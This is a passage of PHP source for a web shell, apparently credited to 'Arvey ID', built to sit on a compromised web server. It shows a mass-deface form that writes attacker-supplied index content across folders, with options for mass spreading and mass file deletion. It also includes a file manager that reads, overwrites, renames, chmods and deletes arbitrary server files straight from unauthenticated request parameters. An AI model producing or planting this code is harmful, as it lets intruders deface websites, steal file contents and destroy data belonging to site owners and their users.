		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='done.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 700px; height: 350x;'>
		</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}			
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
elseif(isset($_GET['filesrc'])){
	echo "<tr><td>";
	echo '</tr></td></table><br />';
	echo "<textarea cols=80 rows=20 name='src'>".htmlspecialchars(file_get_contents($_GET['filesrc']))."</textarea><br />";
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Success</font><br/>';
}else{
echo '<font color="red">Denied</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
if($_GET['file'] == 'asu') {
echo '<div><table width="620" class="content" border="0" cellpadding="3" cellspacing="1">
<tr>
<th><center>Name</center></th>
<th><center>Size</center></th>
<th><center>Permission</center></th>
<th><center>Action</center></th>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><i class="fas fa-folder-open"><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td></i>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><i class="fas fa-file-code"></i> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td></i>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
}
echo "<center><br>Copyright @ ".date("Y")." - <font color='lime'>Arvey ID</font></a></center>";
?>